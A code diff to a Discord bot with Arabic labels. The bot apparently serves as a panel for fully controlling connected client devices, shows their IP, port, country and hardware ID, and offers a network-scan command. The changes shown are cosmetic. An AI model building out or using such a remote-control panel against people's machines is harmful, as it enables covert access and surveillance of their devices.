@@ -262,7 +262,7 @@ class DeviceManageButton(discord.ui.Button):
         port = self.info.get('port', '8888')
         view = DeviceActionsView(self.code, self.info.get("device"), ip, port)
         await interaction.response.send_message(
-            f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
+            f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP : Port -> `{ip} : {port}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
             view=view, 
             ephemeral=True
         )
@@ -434,7 +434,7 @@ class MainDashboardView(discord.ui.View):
                 await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
                 return
             view = DevicesSubMenuView(devices_list)
-            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
+            await interaction.response.send_message("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ خطأ: {str(e)}", ephemeral=True)
 
@@ -502,7 +502,7 @@ async def manage_by_ip_port(interaction: discord.Interaction, ip_port: str):
         return
     ip, port, hwid, country = found_info.get('ip', 'Unknown'), found_info.get('port', '8888'), found_info.get('device'), found_info.get('country', 'Unknown')
     view = DeviceActionsView(found_code, hwid, ip, port)
-    await interaction.followup.send(f"⚙️ **لوحة التحكم المطلق بالعميل (عبر IP & Port):**\n🔑 الكود: `{found_code}`\n🌐 IP : Port $\rightarrow$ `{ip} : {port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", view=view, ephemeral=True)
+    await interaction.followup.send(f"⚙️ **لوحة التحكم المطلق بالعميل (عبر IP & Port):**\n🔑 الكود: `{found_code}`\n🌐 IP : Port -> `{ip} : {port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", view=view, ephemeral=True)
 
 @client.tree.command(name="netscan", description="جلب تقرير كامل عن اتصالات الشبكة والـ IPs والـ Ports النشطة للعميل")
 @app_commands.describe(target="كود التفعيل أو الـ IP الخاص بالعميل")
